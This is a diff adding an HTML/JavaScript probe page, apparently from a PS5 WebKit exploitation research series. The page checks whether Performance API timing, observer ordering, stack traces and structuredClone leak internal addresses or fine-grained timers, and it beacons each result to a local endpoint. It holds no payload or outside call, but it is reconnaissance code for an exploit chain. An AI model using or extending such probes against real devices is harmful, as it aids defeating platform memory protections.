@@ -1,0 +1,299 @@
+<!--
+  p702: Performance API + Resource Timing internal pointer leak
+
+  WebKit 605.1.15 era had several known issues with Performance API
+  exposing more info than intended. On PS5 this could reveal:
+  - Internal buffer addresses via PerformanceEntry object identity
+  - Cross-origin timing (reduced but maybe not fully clamped)
+  - Navigation timing fields that reference internal URL objects
+  - PerformanceObserver callback ordering based on internal queue address
+
+  Also tests: CSS font-display timing as an indirect oracle for
+  FontFace internal state, and requestAnimationFrame frame timing
+  for JIT code execution detection.
+
+  CRASH_CLASS: LOW (read-only observation)
+  prior art: p630 section (performance.now quantized), p602 (JIT)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p702</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P702-START:PERFORMANCE-API-LEAK');
+  var results = [];
+
+  // === SECTION A: performance.now() resolution test ===
+  // If resolution is high enough, we can distinguish JIT paths
+  b('A:TIMING-RESOLUTION');
+  try {
+    var deltas = [];
+    var prev = performance.now();
+    for (var i = 0; i < 1000; i++) {
+      var now = performance.now();
+      if (now !== prev) {
+        deltas.push(now - prev);
+        prev = now;
+      }
+    }
+    var minDelta = deltas.length > 0 ? Math.min.apply(null, deltas) : 0;
+    var maxDelta = deltas.length > 0 ? Math.max.apply(null, deltas) : 0;
+    b('A:DELTAS=' + deltas.length + ',MIN=' + minDelta.toFixed(6) + ',MAX=' + maxDelta.toFixed(6));
+
+    // Sub-millisecond resolution would be useful for side channels
+    if (minDelta > 0 && minDelta < 0.1) {
+      b('A:HIGH-RES-AVAILABLE');
+      results.push('A:highres=' + minDelta.toFixed(6));
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Navigation timing internal fields ===
+  b('B:NAV-TIMING');
+  try {
+    var timing = performance.timing;
+    if (timing) {
+      var fields = {};
+      var keys = ['navigationStart','unloadEventStart','unloadEventEnd',
+        'redirectStart','redirectEnd','fetchStart','domainLookupStart',
+        'domainLookupEnd','connectStart','connectEnd','requestStart',
+        'responseStart','responseEnd','domLoading','domInteractive',
+        'domContentLoadedEventStart','domContentLoadedEventEnd',
+        'domComplete','loadEventStart','loadEventEnd'];
+      var nonZero = [];
+      for (var i = 0; i < keys.length; i++) {
+        var v = timing[keys[i]];
+        if (v && v !== 0) {
+          fields[keys[i]] = v;
+          nonZero.push(keys[i] + '=' + v);
+        }
+      }
+      b('B:NONZERO-FIELDS:' + nonZero.length);
+      if (nonZero.length > 0) {
+        b('B:TIMING:' + nonZero.slice(0, 5).join(','));
+      }
+
+      // Check for any field that looks like a pointer (large number)
+      for (var k in fields) {
+        if (fields[k] > 0x100000000) {
+          b('B:LARGE-VALUE:' + k + '=' + fields[k]);
+          results.push('B:large-timing=' + k);
+        }
+      }
+    } else {
+      b('B:NO-TIMING-API');
+    }
+
+    // Also check performance.getEntries()
+    var entries = performance.getEntries();
+    b('B:ENTRIES=' + entries.length);
+    for (var i = 0; i < Math.min(entries.length, 5); i++) {
+      var e = entries[i];
+      b('B:ENTRY:' + e.entryType + '/' + e.name.substring(0, 50));
+      // Check all numeric properties for pointer-like values
+      var props = Object.getOwnPropertyNames(e);
+      for (var j = 0; j < props.length; j++) {
+        var v = e[props[j]];
+        if (typeof v === 'number' && v > 0x100000000) {
+          b('B:ENTRY-LARGE:' + props[j] + '=' + v);
+          results.push('B:entry-ptr=' + props[j]);
+        }
+      }
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: PerformanceObserver ordering oracle ===
+  // If observer callbacks fire in order of internal queue address,
+  // the ordering of two observers reveals relative address info
+  b('C:OBSERVER-ORDER');
+  try {
+    if (typeof PerformanceObserver !== 'undefined') {
+      var order = [];
+      var obs1 = new PerformanceObserver(function(list) {
+        order.push('obs1:' + list.getEntries().length);
+      });
+      var obs2 = new PerformanceObserver(function(list) {
+        order.push('obs2:' + list.getEntries().length);
+      });
+
+      obs1.observe({entryTypes: ['measure']});
+      obs2.observe({entryTypes: ['measure']});
+
+      // Create performance marks/measures to trigger observers
+      for (var i = 0; i < 10; i++) {
+        performance.mark('test-' + i);
+        performance.measure('meas-' + i, 'test-' + i);
+      }
+
+      // Give observers time to fire
+      // (synchronous XHR beacon forces microtask queue flush)
+      b('C:ORDER:' + order.join(','));
+
+      obs1.disconnect();
+      obs2.disconnect();
+
+      // Check if order is deterministic
+      if (order.length > 0) {
+        b('C:OBSERVER-FIRED:' + order.length + ' callbacks');
+      }
+    } else {
+      b('C:NO-PERF-OBSERVER');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: requestAnimationFrame timing oracle ===
+  // rAF callback receives a high-resolution timestamp
+  // The delta between frames during heavy JIT work reveals
+  // JIT code execution patterns
+  b('D:RAF-TIMING');
+  try {
+    var rafTimes = [];
+    var rafCount = 0;
+
+    function rafCallback(timestamp) {
+      rafTimes.push(timestamp);
+      rafCount++;
+      if (rafCount < 10) {
+        requestAnimationFrame(rafCallback);
+      }
+    }
+
+    // Cannot do async rAF in synchronous probe, just check availability
+    if (typeof requestAnimationFrame === 'function') {
+      b('D:RAF-AVAILABLE');
+
+      // Use Date.now() as fallback for frame timing
+      var frameTimes = [];
+      for (var frame = 0; frame < 20; frame++) {
+        var t0 = Date.now();
+        // Simulate frame work with JIT-heavy computation
+        var fn = new Function('x', 'var r=x;for(var i=0;i<10000;i++)r=(r*1103515245+12345)&0x7FFFFFFF;return r;');
+        for (var i = 0; i < 100; i++) fn(frame);
+        frameTimes.push(Date.now() - t0);
+      }
+      b('D:FRAME-TIMES:' + frameTimes.join(','));
+    } else {
+      b('D:NO-RAF');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Error.stack cross-function address leak ===
+  // Create errors in deeply nested call chains to see if
+  // stack trace format reveals any address info
+  b('E:DEEP-STACK-TRACE');
+  try {
+    function makeChain(depth) {
+      if (depth <= 0) {
+        return new Error('bottom').stack;
+      }
+      return makeChain(depth - 1);
+    }
+
+    // Shallow stack
+    var shallow = makeChain(3);
+    b('E:SHALLOW:' + (shallow || '').substring(0, 150));
+
+    // Deep stack (may show different format at depth limit)
+    var deep = makeChain(50);
+    b('E:DEEP-LEN=' + (deep || '').length);
+    b('E:DEEP-TAIL:' + (deep || '').slice(-150));
+
+    // Check for hex addresses or native frame markers
+    var hexMatches = (deep || '').match(/0x[0-9a-f]{4,}/gi);
+    if (hexMatches) {
+      b('E:HEX-FOUND:' + hexMatches.slice(0, 3).join(','));
+      results.push('E:stack-hex');
+    }
+
+    // Check for [native code] markers that might include address
+    var nativeMatches = (deep || '').match(/\[native[^\]]*\]/gi);
+    if (nativeMatches) {
+      b('E:NATIVE:' + nativeMatches.slice(0, 3).join(','));
+    }
+
+    // Very deep (trigger stack overflow)
+    try {
+      var overflow = makeChain(10000);
+    } catch(stackErr) {
+      var overflowStack = stackErr.stack || '';
+      b('E:OVERFLOW-TYPE:' + stackErr.constructor.name);
+      b('E:OVERFLOW-STACK-LEN:' + overflowStack.length);
+      // Stack overflow error might reveal stack limit address
+      var overflowHex = overflowStack.match(/0x[0-9a-f]{4,}/gi);
+      if (overflowHex) {
+        b('E:OVERFLOW-HEX:' + overflowHex.slice(0, 3).join(','));
+        results.push('E:overflow-hex');
+      }
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: Structured clone internal representation ===
+  // structuredClone may expose internal object layout through
+  // the serialization format or timing
+  b('F:STRUCTURED-CLONE');
+  try {
+    if (typeof structuredClone === 'function') {
+      // Clone various objects and check for identity leaks
+      var obj1 = {a: 1, b: [2, 3], c: new ArrayBuffer(64)};
+      var clone1 = structuredClone(obj1);
+
+      // The clone should be a deep copy with no shared references
+      b('F:CLONE-SAME-REF:' + (clone1 === obj1));
+      b('F:AB-SAME-REF:' + (clone1.c === obj1.c));
+
+      // Time cloning objects of different sizes
+      var cloneTimes = [];
+      for (var size = 64; size <= 16384; size *= 2) {
+        var ab = new ArrayBuffer(size);
+        var view = new Uint8Array(ab);
+        for (var i = 0; i < size; i++) view[i] = i & 0xFF;
+
+        var t0 = performance.now();
+        for (var j = 0; j < 1000; j++) structuredClone(ab);
+        var dt = performance.now() - t0;
+        cloneTimes.push(size + ':' + dt.toFixed(2));
+      }
+      b('F:CLONE-TIMES:' + cloneTimes.join(','));
+
+      // Transfer semantics -- does the old buffer retain address info?
+      var ab2 = new ArrayBuffer(256);
+      new Uint8Array(ab2).fill(0x41);
+      var transferred = structuredClone(ab2, {transfer: [ab2]});
+      b('F:TRANSFERRED-SIZE:' + transferred.byteLength);
+      b('F:OLD-SIZE:' + ab2.byteLength); // should be 0 (detached)
+
+      // Can we observe the old buffer's address through any API?
+      try {
+        var oldView = new Uint8Array(ab2);
+        b('F:OLD-VIEW-LEN:' + oldView.length);
+      } catch(e2) {
+        b('F:OLD-VIEW-ERR:' + e2.message);
+      }
+    } else {
+      b('F:NO-STRUCTURED-CLONE');
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P702-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P702-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P702-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p702: Performance API + Resource Timing internal pointer leak</pre></body></html>
